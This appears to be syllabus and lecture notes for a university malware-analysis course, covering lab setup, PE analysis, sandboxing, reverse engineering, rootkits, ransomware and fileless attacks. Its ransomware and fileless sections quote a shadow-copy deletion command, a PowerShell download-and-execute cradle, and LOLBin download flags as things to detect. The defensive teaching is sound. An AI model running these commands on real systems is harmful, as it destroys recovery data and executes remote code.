course_info.title: Malware Analysis
prerequisites: CY201 - Ethical Hacking and Penetration Testing

learning_objectives: Classify malware by type, behavior, delivery mechanism, and intent
Trace the evolution of malware from early viruses to modern APT tooling
Describe the malware analysis workflow: triage, static, dynamic, and code analysis
Set up a safe, isolated malware analysis environment with proper safeguards
readings: Sikorski & Honig, Practical Malware Analysis, Ch. 1-2
MITRE ATT&CK software taxonomy and technique matrix
Kaspersky, Evolution of Malware (2024 annual report)

lecture_notes.introduction: Malware analysis is the process of understanding what malicious software does, how it works, and how to detect and defend against it. It requires a careful, methodical approach in a controlled environment because malware is designed to cause harm: encrypting files, stealing credentials, establishing persistent remote access, or destroying data. The field has evolved dramatically since the first PC virus (Brain, 1986). Early viruses spread via floppy disks and were often hobbyist experiments. Today's malware is developed by organized criminal groups and nation-state actors as professional software with version control, testing pipelines, and customer support (for ransomware-as-a-service). The taxonomy reflects this evolution: viruses attach to legitimate files, worms self-propagate over networks, trojans disguise themselves as legitimate software, ransomware encrypts data for extortion, rootkits hide at the OS kernel level, botnets coordinate thousands of compromised machines, and spyware exfiltrates data silently. Advanced Persistent Threats (APTs) combine multiple malware types with social engineering and zero-day exploits for long-term espionage. Malware analysts are the immune system of the cybersecurity ecosystem: they dissect new threats, extract indicators of compromise, write detection signatures, and inform defenders. This course teaches you the complete analysis workflow.
key_concepts: Malware types: virus (attaches to host), worm (self-propagates), trojan (masquerades as legitimate), ransomware (encrypts for extortion), rootkit (hides from OS), botnet (distributed control), spyware (data theft)
Analysis types: static (examine without executing), dynamic (observe behavior during execution), code analysis (reverse engineer the logic)
Analysis environment: isolated VMs with no internet, host-only networking, INetSim for network simulation, VM snapshots for rapid restoration
Indicators of Compromise (IoCs): file hashes (MD5/SHA-256), IP addresses, domain names, file paths, registry keys, mutex names
MITRE ATT&CK framework: structured taxonomy of adversary tactics (what they want to achieve) and techniques (how they achieve it)
Malware-as-a-Service: criminal business model where malware developers sell or rent their tools to operators who conduct attacks
Kill chain model: delivery, exploitation, installation, C2, actions on objectives; analysis reveals where in the chain the malware operates
YARA rules: pattern-matching language for classifying and detecting malware based on byte patterns, strings, and conditions
Triage: rapid initial assessment to determine malware family, severity, and analysis priority using automated tools before deep analysis
lecture_notes.demonstration: Set up a FlareVM analysis workstation in VirtualBox: install PEStudio, x64dbg, Ghidra, Process Monitor, and Wireshark. Configure an isolated network with INetSim on a REMnux VM providing fake DNS, HTTP, HTTPS, and SMTP services. Take a clean snapshot. Then perform initial triage on a sample: check file hash against VirusTotal, examine with PEStudio for suspicious imports and high entropy, and classify using YARA rules from the Yara-Rules repository.
setup_requirements: FlareVM (Windows analysis VM) configured in VirtualBox with snapshot
REMnux (Linux analysis VM) with INetSim for network simulation
Host-only network adapter connecting both VMs with no internet access
VirusTotal API access for hash checking during triage

review.value: Never analyze malware on a production machine or a machine connected to the internet. Always use isolated VMs with snapshots. Host-only networking ensures malware cannot reach the real internet. INetSim provides fake services so the malware behaves normally while containment is maintained.

Static analysis examines the malware without running it: strings, PE headers, imports. It is safe but defeated by packing and obfuscation. Dynamic analysis observes behavior during execution: file, registry, network activity. It reveals the actual behavior but misses code paths not triggered during observation. Use both.

When analyzing malware, map each observed behavior to an ATT&CK technique: registry persistence = T1547.001, process injection = T1055, DNS tunneling C2 = T1071.004. This standardized taxonomy enables communication between analysts and correlation across campaigns.

IoCs have a shelf life. IP addresses and domains are rotated by attackers within days or weeks. File hashes change with every recompile. Behavioral patterns (registry keys, mutex names, C2 protocol structure) persist longer and are more valuable for detection.

class_schedule.topic: Static Analysis: Strings, PE Headers, and Import Tables
learning_objectives: Extract and analyze PE file headers, sections, and import/export tables
Use strings analysis and entropy measurement to identify packed or encrypted samples
Apply YARA rules for automated malware detection and classification
Identify malware capabilities from static indicators without executing the sample
readings: Practical Malware Analysis, Ch. 3 (Basic Static Analysis)
Microsoft PE/COFF Specification
FLARE Team, FLOSS: FLARE Obfuscated String Solver documentation

lecture_notes.introduction: Static analysis is the safest first step in malware analysis because the malware is never executed. It reveals the malware's structure, imported capabilities, embedded strings, and often its purpose without any risk of infection. The PE (Portable Executable) format is the standard binary format for Windows executables and DLLs. Its headers contain metadata that reveals compilation time, target architecture, entry point, and section layout. The import address table (IAT) lists Windows API functions the malware calls, directly revealing its capabilities: CreateRemoteThread indicates process injection, InternetOpenUrl indicates network communication, CryptEncrypt indicates encryption. Strings embedded in the binary reveal IP addresses, URLs, registry paths, error messages, and debug information that the developer forgot to remove. Entropy analysis measures the randomness of each section: normal compiled code has entropy around 5.0-6.5, while packed or encrypted sections have entropy above 7.0 (maximum 8.0). High-entropy sections indicate that the real malware payload is hidden and will only be revealed at runtime through unpacking, making dynamic analysis necessary. Tools like PEStudio, CFF Explorer, and DIE (Detect It Easy) automate much of this analysis, but understanding what the tools are checking is essential for interpreting results on novel or sophisticated samples.
key_concepts: PE header analysis: DOS header, PE signature, COFF header (machine type, timestamp), Optional header (entry point, image base, subsystem)
PE sections: .text (code), .data (initialized data), .rdata (read-only data, imports), .rsrc (resources), .reloc (relocation table)
Import Address Table (IAT): lists DLLs and their functions that the executable calls, reveals capabilities without execution
Suspicious imports: CreateRemoteThread (injection), VirtualAllocEx (remote memory allocation), WriteProcessMemory (process hollowing), WinExec (command execution), CryptEncrypt (encryption)
Strings analysis: extract ASCII and Unicode strings, look for URLs, IPs, registry paths, file paths, error messages, C2 commands
FLOSS (FLARE Obfuscated String Solver): automatically deobfuscates strings that are XOR-encoded, stack-constructed, or decoded at runtime
Entropy analysis: Shannon entropy per section, values above 7.0 indicate packing or encryption, normal code is 5.5-6.5
Packer identification: Detect It Easy (DIE), PEiD identify packers (UPX, Themida, VMProtect) by signature patterns in headers and entry point code
YARA rules: rules matching byte patterns, strings, PE characteristics, and conditions for automated classification
lecture_notes.demonstration: Analyze a malware sample with PEStudio: examine the PE header compilation timestamp (is it recent or does it match known campaigns?), check imports (CreateRemoteThread + VirtualAllocEx = process injection capability), extract strings (find a hardcoded C2 URL and a mutex name), measure section entropy (.text at 7.8 suggests UPX packing). Use DIE to confirm UPX packing. Unpack with upx -d. Re-analyze the unpacked sample to reveal the hidden imports and strings. Write a YARA rule matching the C2 URL pattern and the mutex name.
setup_requirements: PEStudio, CFF Explorer, PE-bear for PE analysis
FLOSS (FLARE Obfuscated String Solver) for string deobfuscation
Detect It Easy (DIE) for packer identification
UPX unpacker, YARA for rule testing

review.value: CreateToolhelp32Snapshot + Process32First = process enumeration. OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread = classic DLL injection. NtUnmapViewOfSection + NtMapViewOfSection = process hollowing. These import chains are malware signatures even without executing the code.

Packed executables have: high entropy (above 7.0) in code sections, few readable strings, small import table (only LoadLibrary and GetProcAddress needed to unpack), unusual section names (UPX0/UPX1), and large size difference between file and memory image. Unpacking must occur before meaningful static analysis.

The PE header contains a TimeDateStamp field set at compile time. A future date indicates the timestamp was manipulated. A date matching known campaign timelines connects the sample to a threat actor. Some malware families always zero out the timestamp to prevent attribution.

Use at least 3 conditions combining strings, byte patterns, and PE features to reduce false positives. Test against a clean file corpus before deploying. Include a description and reference to the analysis report. Rules targeting unique strings are more specific than rules targeting common API calls.

class_schedule.topic: Dynamic Analysis: Sandboxing and Behavioral Monitoring
learning_objectives: Execute malware safely in a sandbox environment with proper containment
Monitor file system, registry, process, and network activity during execution
Identify malware capabilities from behavioral observations
Compare manual dynamic analysis with automated sandbox analysis
readings: Practical Malware Analysis, Ch. 4 (Dynamic Analysis Basics)
Cuckoo Sandbox documentation and analysis module reference
ANY.RUN Interactive Sandbox analysis examples

lecture_notes.introduction: Dynamic analysis reveals what malware actually does when it runs. This is essential for understanding packed or obfuscated samples whose static characteristics are deliberately hidden. By monitoring the malware's interactions with the operating system -- file creation, registry modification, process creation, network communication -- we observe its behavior without needing to understand its code. The Sysinternals tools are the Swiss Army knife of manual dynamic analysis on Windows. Process Monitor captures every file, registry, and network operation. Process Explorer shows the process tree with DLLs and handles. Regshot takes before/after snapshots highlighting all changes. FakeNet-NG captures network traffic to identify C2 communication. Automated sandboxes (Cuckoo, ANY.RUN, Joe Sandbox) combine all these monitoring capabilities with automated reporting. Manual analysis provides deeper insight but is slower; automated analysis provides breadth for triaging large volumes.
key_concepts: Process Monitor (ProcMon): real-time monitoring of file, registry, network, process, and thread activity with filtering by process name or operation type
Process Explorer: advanced task manager showing process tree, DLLs loaded, handles, network connections, and GPU usage
Regshot: before/after registry comparison highlighting all keys and values created, modified, or deleted
FakeNet-NG: network simulation tool that responds to DNS, HTTP, HTTPS, SMTP, capturing malware network communication without internet access
Behavioral indicators: file drops (copying itself), persistence (registry Run keys, scheduled tasks), process injection, C2 communication (beaconing)
Automated sandboxes: Cuckoo (open-source), ANY.RUN (interactive), Joe Sandbox (commercial), VirusTotal behavior analysis
Sandbox evasion: malware may detect VMs, debuggers, or sandboxes and behave differently in analysis environments
API monitoring: hooking Windows API calls to log every system call the malware makes with parameters and return values
Mutex analysis: malware creates named mutexes to prevent multiple instances; the mutex name is a reliable IoC
lecture_notes.demonstration: Execute a ransomware sample in the FlareVM sandbox with ProcMon, Process Explorer, and FakeNet-NG running. Observe: (1) ProcMon shows file enumeration and encryption. (2) Registry persistence via Run key. (3) FakeNet-NG captures C2 communication. (4) Process Explorer shows a unique mutex. Map each behavior to MITRE ATT&CK. Restore from snapshot.
setup_requirements: FlareVM with ProcMon, Process Explorer, Regshot, and FakeNet-NG
VM snapshot taken before malware execution
Wireshark or FakeNet-NG for network capture

review.value: ProcMon captures thousands of events per second from all processes. Filter by Process Name = malware.exe to isolate malware activity. Key operations: CreateFile, RegSetValue, TCP Connect, WriteFile. Save the filtered log for the analysis report.

Common: Registry Run/RunOnce keys, Scheduled Tasks, Windows Services, Startup folder shortcuts, WMI event subscriptions. Less common: DLL search order hijacking, COM object hijacking, AppInit_DLLs. Check all of these in dynamic analysis.

DNS queries reveal C2 domain names. HTTP/HTTPS connections reveal C2 IP addresses. POST requests may contain exfiltrated data. Periodic connections with consistent intervals indicate automated C2 check-in (beaconing).

Automated sandbox reports may miss behavior if the malware sleeps longer than the analysis timeout, requires user interaction, or checks for specific environment conditions. Always verify automated results with targeted manual analysis.

learning_objectives: Use API monitoring to trace Windows API calls made by malware with full parameter logging
Identify malware behavioral patterns: keylogging, screen capture, credential theft, data staging
Correlate API call sequences to identify high-level malware capabilities
Distinguish between benign and malicious use of common Windows APIs
readings: Practical Malware Analysis, Ch. 7 (Windows Internals for Malware Analysis)
Windows API documentation for security-relevant functions
Mandiant, Tracking Malware with API Call Sequences

lecture_notes.introduction: API tracing goes deeper than behavioral monitoring by logging every Windows API call with all parameters and return values. Understanding which API sequences correspond to which capabilities is essential. Keylogging uses SetWindowsHookEx with WH_KEYBOARD_LL. Screen capture uses GetDC and BitBlt. Credential theft reads browser databases with CryptUnprotectData. Process injection follows OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread. Each produces a distinctive API sequence that an analyst can recognize. This lecture covers how to use API Monitor and Frida for deep behavioral analysis, and how to map API sequences to MITRE ATT&CK techniques for standardized reporting.
key_concepts: API monitoring tools: API Monitor (Windows, full parameter logging), Frida (cross-platform dynamic instrumentation)
Keylogging APIs: SetWindowsHookEx(WH_KEYBOARD_LL), GetAsyncKeyState, RegisterRawInputDevices
Screen capture APIs: GetDC(NULL), BitBlt, CreateCompatibleBitmap, GetDIBits
Credential theft APIs: CryptUnprotectData (decrypt stored passwords), CredEnumerateA (enumerate Windows credentials)
Process injection sequence: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread
Process hollowing sequence: CreateProcess(SUSPENDED), NtUnmapViewOfSection, VirtualAllocEx, WriteProcessMemory, SetThreadContext, ResumeThread
Token manipulation: OpenProcessToken, DuplicateTokenEx, ImpersonateLoggedOnUser
Data staging: CreateFile (temp directory), WriteFile (collected data), compress/encrypt, network send, DeleteFile (cleanup)
Anti-forensics APIs: DeleteFileA, NtSetInformationFile (timestomping), RtlAdjustPrivilege
lecture_notes.demonstration: Use API Monitor to trace a spyware sample: observe keyboard hook installation, keystroke capture, Chrome password decryption via CryptUnprotectData, data staging and Base64 encoding, HTTP POST exfiltration. Map each API sequence to ATT&CK techniques.
setup_requirements: API Monitor configured for Windows API call interception
FlareVM with Chrome installed (containing test credentials)
MITRE ATT&CK reference for technique mapping

review.value: The classic DLL injection sequence is detectable by EDR via API hooking. Modern malware uses APC injection, atom bombing, process hollowing, or direct syscalls to bypass API hooks.
Windows DPAPI encrypts stored credentials using a key derived from the user's login password. Any malware running in the user's context can call CryptUnprotectData to steal all stored credentials.

Signature-based detection matches known byte patterns. Behavioral detection monitors API sequences: any process that installs a keyboard hook and sends data over HTTP is suspicious regardless of file hash.

Advanced malware bypasses API hooks by calling syscalls directly using the syscall instruction instead of going through ntdll.dll. Detecting this requires kernel-level monitoring or hardware-assisted tracing.

class_schedule.topic: x86 Assembly Fundamentals for Malware Analysis
learning_objectives: Read x86 and x86-64 assembly instructions relevant to malware analysis
Understand register usage, stack operations, and calling conventions
Identify common code patterns: loops, conditionals, function calls, string operations
Trace data flow through assembly to understand malware logic
readings: Practical Malware Analysis, Ch. 5 (IDA Pro, assembly refresher)
Intel 64 and IA-32 Architectures Software Developer Manual, Vol. 1 (selected chapters)
x86 Assembly Language Reference (provided cheat sheet)

lecture_notes.introduction: Reverse engineering malware requires reading assembly language. While decompilers produce pseudo-C code, they sometimes produce incorrect or misleading output for obfuscated code. An analyst who reads assembly directly can verify decompiler output and analyze anti-analysis tricks. x86 assembly uses a small instruction set: data movement (mov, push, pop, lea), arithmetic (add, sub, imul), logic (and, or, xor), comparison (cmp, test), control flow (jmp, je, jne, call, ret), and string operations (rep movsb). The key is understanding registers (eax-edx for general purpose, esp for stack pointer, ebp for frame pointer), the stack (grows downward, holds local variables and return addresses), and calling conventions (cdecl vs stdcall vs x64). With this foundation, you can trace data flow: where does the encryption key come from? What URL does the malware connect to?
key_concepts: x86 registers: EAX (return value), ECX (counter), EDX (data), ESP (stack pointer), EBP (frame pointer), ESI/EDI (string source/destination)
x86-64 extensions: RAX-RDX (64-bit), R8-R15 (additional), first 4 args in RCX, RDX, R8, R9 (Windows x64)
Stack operations: PUSH decrements ESP and stores, POP loads and increments, stack grows downward
Function prologue: push ebp; mov ebp, esp; sub esp, N (allocate locals)
Function epilogue: mov esp, ebp; pop ebp; ret (restore and return)
Calling conventions: cdecl (caller cleans stack), stdcall (callee cleans, Windows API), fastcall (first 2 args in ECX/EDX)
Common patterns: XOR EAX, EAX (zero register), TEST EAX, EAX; JZ (check zero), CMP + conditional jump (if/else)
String operations: REP MOVSB (memcpy), REP STOSB (memset), with ESI source, EDI destination, ECX count
LEA (Load Effective Address): computes address without memory access, often used for arithmetic
lecture_notes.demonstration: Disassemble a simple C program in Ghidra and map assembly to source code. Identify function prologue, local variables, a for loop, if/else branching, and a Windows API call. Then examine a malware XOR decryption loop in assembly: trace data flow to find the key and encrypted data address.
setup_requirements: Simple C programs compiled for comparison
Sample malware with XOR encryption loop

review.value: The most common string obfuscation: XOR each byte with a key. Single-byte XOR is trivially breakable (try all 256 values). Multi-byte keys require identifying the key length first.
32-bit: arguments PUSHed right-to-left, then CALL. 64-bit: first 4 args in RCX/RDX/R8/R9. The function name from the import table identifies the API.
Local variables at negative EBP offsets: [EBP-4] first local. Arguments at positive offsets: [EBP+8] first argument. Understanding this layout identifies what data the malware processes.
if (x == 5): CMP EAX, 5; JNE else_block. while (x > 0): CMP, JLE exit, body, JMP top. switch: series of CMP/JE or a jump table.

class_schedule.topic: Disassembly Tools: Ghidra and IDA Free
learning_objectives: Navigate disassembled code efficiently in Ghidra and IDA Free
Use cross-references to trace data flow and identify key malware functions
Apply the Ghidra decompiler to convert assembly to pseudo-C for analysis
Rename functions and variables to build understanding of malware structure
readings: Practical Malware Analysis, Ch. 5-6 (IDA Pro basics)
Ghidra documentation: CodeBrowser and Decompiler usage
Eagle, The IDA Pro Book, Ch. 1-5

lecture_notes.introduction: Reverse engineering reveals the exact logic, algorithms, and secrets in malware code. Ghidra and IDA are the dominant disassembly tools. Effective reverse engineering means finding interesting functions, not reading sequentially. The workflow: import binary, check imports for suspicious APIs, follow cross-references, understand the logic, rename functions. Cross-references are the most powerful navigation tool: from any function or string, find every location that calls or references it.
key_concepts: Ghidra CodeBrowser: listing view, decompiler view, function graph, symbol tree
Auto-analysis: identifies functions, cross-references, data types, and string references automatically
Cross-references (xrefs): from any function, see every caller and callee
String cross-references: find suspicious string, press X to see referencing function
Decompiler output: pseudo-C approximating original source, may have errors with obfuscated code
Renaming workflow: rename sub_401000 to decrypt_c2_url after understanding its purpose
Struct and type annotation: define structures for configurations and packets to improve decompiler output
Ghidra scripting: automate tasks like decoding XOR strings or extracting configurations
Configuration extraction: find encrypted config blob in .data or .rsrc, reverse the decryption, extract IoCs
lecture_notes.demonstration: Load malware into Ghidra. Follow calls from main to find a function calling InternetOpenUrlA. Trace the URL parameter to a XOR-decode function. Use the decompiler to understand the XOR loop, identify the key, decode the C2 URL. Rename functions to make the malware readable.

review.value: Decompilers struggle with hand-written assembly, anti-decompiler tricks, and indirect calls. Always verify output against the assembly.
Check imports for suspicious APIs, check strings for URLs/IPs, follow xrefs to the functions that use them. Do not read linearly from the entry point.
Ghidra: free, open-source, excellent decompiler. IDA Pro: commercial, faster for large binaries, industry standard Hex-Rays decompiler.
Many families store encrypted C2 configs in .data or .rsrc sections. Finding and decrypting this configuration produces IoCs for the entire campaign.

learning_objectives: Use x64dbg to debug Windows malware: breakpoints, stepping, memory inspection
Use GDB to debug Linux malware and ELF binaries
Capture decrypted data at runtime by breaking at the right execution point
Defeat simple anti-debugging techniques during live analysis
readings: Practical Malware Analysis, Ch. 9-10 (OllyDbg and Debugging)
x64dbg documentation and plugin reference
GDB Reference Manual (breakpoints and memory inspection)

lecture_notes.introduction: Debugging gives complete control over malware execution: pause at any instruction, inspect memory, modify registers, and capture decrypted payloads. This is essential for packed malware where the unpacking stub decrypts the real payload into memory. x64dbg is the standard Windows debugger with plugins for anti-anti-debugging (ScyllaHide) and import reconstruction (Scylla). GDB handles Linux malware with PEDA/GEF enhancements. The key skill is knowing where to set breakpoints: on API calls that reveal behavior, on memory where decrypted data appears, and on jumps that determine code paths.
key_concepts: Breakpoints: software (INT3, modifies code) vs hardware (debug registers, invisible, limited to 4)
Step over (F8): execute next instruction, stepping over function calls
Step into (F7): enter function calls to trace internal logic
Memory dump: after unpacking, dump decrypted payload using Scylla plugin
Conditional breakpoints: break only when register/memory meets a condition
API breakpoints: break on Windows API functions to intercept all calls
Memory breakpoints: break on read/write/execute access to a region
IAT reconstruction: after dumping, Scylla reconstructs destroyed import tables
Unpacking strategy: break on VirtualAlloc, find new allocation, set execute breakpoint, dump when triggered
lecture_notes.demonstration: Debug a packed sample in x64dbg: break on VirtualAlloc, note the allocated address, set memory execute breakpoint, run until triggered, dump with Scylla, fix IAT, analyze in Ghidra with full visibility.
setup_requirements: x64dbg with ScyllaHide and Scylla plugins
GDB with PEDA or GEF plugin
Packed malware sample for unpacking exercise

review.value: Most packers: allocate memory (VirtualAlloc), write decrypted code, transfer execution. Break on VirtualAlloc, find allocation, set hardware execute breakpoint, run, dump when it triggers.
Software breakpoints modify code (detectable). Hardware breakpoints use CPU debug registers (invisible). Use hardware breakpoints when malware checks code integrity.
break *0x401000, run, si (step instruction), info registers, x/20x $rsp (examine memory). PEDA/GEF adds colorized output.
After dumping, verify in PEStudio/Ghidra: imports resolved, strings readable, entry point sensible. Corrupted dumps indicate wrong breakpoint timing.

class_schedule.topic: Anti-Analysis Techniques: Packers and VM Detection
learning_objectives: Identify and bypass common anti-analysis techniques used by malware
Understand code obfuscation: control flow flattening, opaque predicates, string encryption
Defeat anti-VM and anti-sandbox checks during analysis
Unpack multi-layer packed samples using debugging techniques
readings: Practical Malware Analysis, Ch. 15-17 (Anti-Debugging, Anti-VM, Packers)
Ferrie, The Ultimate Anti-Debugging Reference
Chen et al., A Survey on Anti-Analysis Techniques for Malware (2023)

lecture_notes.introduction: Sophisticated malware employs anti-analysis techniques to frustrate reverse engineering. Anti-debugging checks detect debuggers (IsDebuggerPresent, timing checks). Anti-VM detects virtualized environments (registry keys, CPUID, MAC addresses). Anti-sandbox checks for analyst indicators (short uptime, few processes). Packers compress/encrypt the payload. Understanding and bypassing these is a prerequisite for analyzing advanced malware.
key_concepts: Anti-debugging: IsDebuggerPresent, NtQueryInformationProcess(ProcessDebugPort), timing checks (RDTSC, GetTickCount), INT 2D, TLS callbacks
Anti-VM: registry checks for VMware/VirtualBox, CPUID hypervisor bit, MAC address OUI patterns, device name checks
Anti-sandbox: uptime check, process count, disk size, user activity monitoring, screen resolution
Packing: UPX (easy), Themida/VMProtect (code virtualization, very hard), ASPack, PECompact
Multi-layer packing: outer packer reveals inner packer, requiring multiple unpacking iterations
Code obfuscation: control flow flattening, opaque predicates, dead code insertion
String encryption: all strings encrypted and decrypted at runtime by stub function
ScyllaHide: x64dbg plugin that patches anti-debugging checks automatically
VM hardening: change MAC, remove tools, add documents, ensure sufficient uptime and resources
lecture_notes.demonstration: Analyze malware with IsDebuggerPresent, VMware registry checks, and uptime checks. Use ScyllaHide and manual patching to bypass each. After bypassing, the malware reveals its actual C2 behavior.
setup_requirements: VMware/VirtualBox with VM artifact modification capability

review.value: Patches PEB.BeingDebugged, NtGlobalFlag, NtQueryInformationProcess, timing attacks, and more. For custom checks, manual patching is needed.
Change MAC to non-VMware OUI, remove tools, add documents and browser history, ensure 2+ CPUs, 4GB+ RAM, 30+ minute uptime.
NOP out the comparison/jump, or use ScyllaHide timing prevention that returns consistent values.
VMProtect/Themida convert x86 to custom VM bytecode. The original instructions are gone. Behavioral analysis may be more practical than reversing VM-protected code.

learning_objectives: Classify rootkits by privilege level: user-mode, kernel-mode, hypervisor, firmware
Understand kernel-mode rootkit techniques: SSDT hooking, DKOM, filter drivers
Analyze bootkit infection of MBR and UEFI firmware
Detect rootkits using integrity checking and memory forensics
readings: Practical Malware Analysis, Ch. 18 (Rootkit Concepts)
Hoglund & Butler, Rootkits: Subverting the Windows Kernel, Ch. 1-4
ESET Research, FinSpy UEFI Bootkit Analysis

lecture_notes.introduction: Rootkits hide malware from the OS and security tools by operating at privileged levels. Kernel-mode rootkits can hide files, processes, registry keys, and network connections by intercepting OS API calls. Bootkits infect the boot process to load before any security software. UEFI firmware rootkits persist in SPI flash and survive OS reinstallation. Memory forensics with Volatility bypasses rootkit hiding by scanning raw memory directly.
key_concepts: User-mode rootkits: IAT hooking, inline hooking, DLL injection into target processes
Kernel-mode rootkits: SSDT hooking, DKOM (unlinking processes from ActiveProcessLinks), filter drivers
MBR bootkit: replaces Master Boot Record, loads before the OS, hooks the kernel during boot
UEFI bootkit: infects SPI flash firmware, survives OS reinstall and disk replacement
Secure Boot: UEFI signature verification blocks unsigned boot components
Cross-view detection: compare OS view (compromised) with raw memory scan (bypasses hooks)
Volatility Framework: memory forensics finding hidden processes, injected code, kernel hooks
Driver signature enforcement: Windows requires signed drivers, bypassed via BYOVD (Bring Your Own Vulnerable Driver)
BYOVD: attackers load a legitimate signed driver with a known vulnerability to gain kernel access
lecture_notes.demonstration: Analyze a memory dump with Volatility: use pslist vs psscan to find DKOM-hidden processes, ssdt to find hooked syscalls, malfind to find injected code, driverirp to find filter driver hooks. Produce a rootkit artifact report.
setup_requirements: Clean system memory dump for comparison

review.value: pslist walks the ActiveProcessLinks list (OS view). psscan scans raw memory for EPROCESS structures (bypasses DKOM). Discrepancy = hidden processes.
BlackLotus (2023) exploited a signed bootloader vulnerability. BYOVD uses legitimate vulnerable drivers to load unsigned rootkit code.
Attackers include a legitimately signed but vulnerable driver, exploit it for kernel write, load their rootkit. Bypasses driver signature enforcement.
UEFI rootkits in SPI flash survive OS reinstall, disk formatting, and disk replacement. Removal requires SPI chip reflashing.

learning_objectives: Analyze ransomware encryption: key generation, file targeting, and encryption workflow
Identify ransomware families from ransom notes, extensions, and encryption patterns
Evaluate key recovery possibilities based on cryptographic implementation flaws
Map ransomware behavior to MITRE ATT&CK for detection engineering
readings: Practical Malware Analysis supplements on ransomware
No More Ransom project: Decryptor documentation
CISA, #StopRansomware advisory series (selected)

lecture_notes.introduction: Ransomware is the most impactful malware category with $20B+ annual damages. Understanding encryption implementation determines whether recovery is possible without paying. Well-implemented ransomware (AES per file, RSA-wrapped keys, CryptGenRandom) is unrecoverable. Flawed implementations (single AES key, predictable RNG seed, partial encryption) may allow key recovery. This lecture covers technical analysis of ransomware encryption and detection before encryption completes.
key_concepts: Encryption workflow: enumerate drives, identify target files by extension, generate keys, encrypt, drop ransom note, delete shadow copies
Hybrid encryption: random AES key per file (fast), RSA/ECC wraps each AES key (only attacker's private key decrypts)
Key generation flaws: rand() instead of CryptGenRandom, GetTickCount seed (32-bit, brute-forcible), reusing AES key across files
Partial encryption: some ransomware encrypts only the first 1MB for speed, leaving rest recoverable
Shadow copy deletion: vssadmin delete shadows /all /quiet prevents Windows system restore
Ransomware families: LockBit (intermittent encryption), BlackCat (Rust, cross-platform), Conti (leaked source code)
Detection: mass file renaming, shadow copy deletion, high CPU + disk I/O pattern
Ransom notes: Tor URLs, Bitcoin/Monero addresses, victim IDs
No More Ransom: free decryptors for families with known key recovery methods
lecture_notes.demonstration: Analyze a ransomware sample through static (file enumeration imports, encryption functions), dynamic (ProcMon showing file encryption, shadow copy deletion, C2 beacon), and debug analysis (break on key generation to assess recovery feasibility).
setup_requirements: FlareVM with ransomware sample (defanged for lab)

review.value: LockBit 3.0 encrypts 4KB per 16KB (intermittent encryption) for speed. More data recoverable but files still unusable.
CryptGenKey left prime numbers in memory. WanaKiwi recovered them to reconstruct keys. Only worked if machine had not rebooted.
File share enumeration, shadow copy deletion, disabling Windows Defender, mass file access patterns. EDR can detect and kill before encryption begins.
2022 leak enabled analysis of ChaCha20 encryption, network scanning, and C2 protocol. Source code leaks are goldmines for analysts.

learning_objectives: Identify fileless malware techniques that avoid writing to disk
Analyze PowerShell, WMI, and .NET-based malware delivery and execution
Catalog Living-off-the-Land Binaries and their malicious use cases
Develop detection strategies using process monitoring and script logging
readings: LOLBAS Project: Living Off The Land Binaries, Scripts, and Libraries
Mandiant, Fileless Malware: A Definition and Analysis
Microsoft, PowerShell Logging and Detection whitepaper

lecture_notes.introduction: Fileless malware executes in memory using legitimate system tools, evading file-based detection. LOLBins (certutil, mshta, regsvr32, bitsadmin, PowerShell) are trusted executables abused for malicious purposes. WMI persistence uses event subscriptions for code execution. .NET Assembly.Load executes compiled code from byte arrays without disk writes. Analyzing fileless attacks requires PowerShell script block logging, Sysmon event monitoring, and ETW tracing.
key_concepts: Fileless execution: PowerShell in-memory, .NET Assembly.Load, reflective DLL injection
PowerShell download cradle: IEX (New-Object Net.WebClient).DownloadString() for in-memory execution
LOLBins: certutil (download), mshta (HTA execution), regsvr32 (COM scriptlet), bitsadmin (download), rundll32 (DLL execution)
WMI persistence: EventFilter + CommandLineEventConsumer + FilterToConsumerBinding
Reflective DLL injection: loads DLL from memory without LoadLibrary, avoiding disk writes
.NET in-memory: Assembly.Load(byte[]) loads compiled C# from a byte array
AMSI (Antimalware Scan Interface): scans PowerShell and .NET before execution
AMSI bypass: patching AmsiScanBuffer in memory, obfuscation to evade scanning
Detection: PowerShell script block logging (Event ID 4104), Sysmon process creation (Event ID 1), WMI events (19-21)
lecture_notes.demonstration: Analyze a fileless attack: VBA macro executes encoded PowerShell, which downloads C# payload executed via Assembly.Load, establishing C2 via WMI persistence. Analyze each stage: decode PowerShell, capture .NET payload from script block logs, decompile with dnSpy.
setup_requirements: FlareVM with PowerShell script block logging enabled

review.value: Event ID 4104 logs full content of every PowerShell script, even obfuscated ones. The most valuable log source for PowerShell attacks.
Monitor command lines: certutil with -urlcache (download), mshta with URL (remote execution), regsvr32 with /i:http:// (remote scriptlet).
Sysmon Events 19-21 log WMI event filter/consumer/binding creation. Query: Get-WmiObject -Namespace root/subscription -Class __EventConsumer.
AMSI catches known patterns but sophisticated attackers bypass via patching or obfuscation. Defense in depth (logging + behavioral detection) supplements AMSI.

class_schedule.topic: Script-Based Malware: PowerShell, VBA, and JavaScript
learning_objectives: Deobfuscate malicious PowerShell scripts using manual and automated techniques
Analyze VBA macros in Office documents for malicious behavior
Examine JavaScript-based malware and HTML smuggling delivery
Extract IoCs and execution chains from script-based malware
readings: Practical Malware Analysis supplements on script analysis
SANS, Deobfuscating Malicious PowerShell reference
olevba and oletools documentation

lecture_notes.introduction: Script malware uses trusted interpreters (PowerShell, wscript, cscript, mshta) for initial access. Attackers heavily obfuscate scripts using string concatenation, Base64 encoding, character substitution, and nested encoding. VBA macros in Office documents are a primary delivery method. JavaScript malware uses HTML smuggling to construct and download payloads at runtime. The analysis workflow: identify language and entry point, peel obfuscation layers one at a time, extract core functionality, identify IoCs.
key_concepts: PowerShell obfuscation: -EncodedCommand (Base64), string concatenation, backtick escaping, variable substitution, IEX wrapping
PowerShell deobfuscation: replace IEX with Write-Output to safely reveal decoded commands
VBA analysis: oletools/olevba extracts macros, Auto_Open for auto-execution, Shell/WScript.Shell for commands
VBA obfuscation: Chr() for character-by-character strings, Environ for path resolution, CallByName for indirect calls
JavaScript malware: WSH executes .js via wscript.exe, ActiveXObject for file/network access
HTML smuggling: JavaScript constructs binary blob at runtime, bypassing web filters
Multi-stage: macro downloads PowerShell which downloads executable, each stage adds obfuscation
CyberChef: chain decode operations (Base64, XOR, gunzip) for multi-layer deobfuscation
Safe analysis: use Write-Output instead of Invoke-Expression, analyze in isolated VM
